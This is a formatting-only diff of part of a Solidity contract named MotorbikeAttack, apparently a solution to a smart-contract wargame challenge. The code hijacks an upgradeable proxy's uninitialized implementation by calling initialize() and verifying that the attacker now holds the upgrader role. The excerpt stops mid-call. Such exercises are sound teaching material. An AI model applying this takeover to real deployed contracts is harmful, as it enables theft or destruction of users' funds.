@@ -18,23 +18,16 @@ contract MotorbikeAttack {
      */
     function attack(address implementation) external {
         // solhint-disable-next-line avoid-low-level-calls
-        (bool isSuccess, ) = implementation.call(
-            abi.encodeWithSignature("initialize()")
-        );
+        (bool isSuccess, ) = implementation.call(abi.encodeWithSignature("initialize()"));
 
         require(isSuccess, "Motorbike: Call error");
 
         // solhint-disable-next-line avoid-low-level-calls
-        (bool isSuccess_, bytes memory data) = implementation.call(
-            abi.encodeWithSignature("upgrader()")
-        );
+        (bool isSuccess_, bytes memory data) = implementation.call(abi.encodeWithSignature("upgrader()"));
 
         require(isSuccess_, "Motorbike: Call error");
 
-        require(
-            address(this) == address(bytes20(bytes32(data) << 96)),
-            "Motorbike: Wrong address"
-        );
+        require(address(this) == address(bytes20(bytes32(data) << 96)), "Motorbike: Wrong address");
 
         // solhint-disable-next-line avoid-low-level-calls
         (bool _isSuccess_, ) = implementation.call(
